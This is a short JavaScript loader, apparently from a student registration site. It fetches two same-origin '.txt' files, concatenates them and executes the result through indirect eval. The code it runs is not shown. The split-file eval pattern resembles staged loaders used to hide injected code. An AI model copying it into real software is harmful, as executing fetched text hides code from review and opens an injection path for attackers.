(function(){
  var F=["/js/_asr_body_a.txt","/js/_asr_body_b.txt"];
  Promise.all(F.map(function(f){
    return fetch(f,{credentials:"same-origin"}).then(function(r){
      if(!r.ok) throw new Error(f+" "+r.status);
      return r.text();
    });
  })).then(function(p){ (0,eval)(p.join("")); })
  .catch(function(e){ console.error("[students-reg] load failed", e); });
})();
